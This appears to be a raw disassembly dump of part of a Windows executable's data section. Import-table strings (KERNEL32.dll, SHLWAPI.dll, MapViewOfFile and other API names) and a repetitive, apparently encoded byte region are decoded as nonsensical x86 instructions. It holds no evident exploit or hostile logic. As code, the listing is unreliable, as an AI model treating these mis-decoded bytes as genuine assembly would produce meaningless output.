  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	fnsave [edi+0x36]
  413baa:	inc    ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	hlt    
  413bf5:	add    BYTE PTR [ebx+0x0],al
  413bf8:	pop    ecx
  413bf9:	dec    ecx
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    BYTE PTR [edx+0x11],ch
  413c46:	inc    ebx
  413c47:	add    BYTE PTR [eax],al
  413c49:	add    BYTE PTR [eax],al
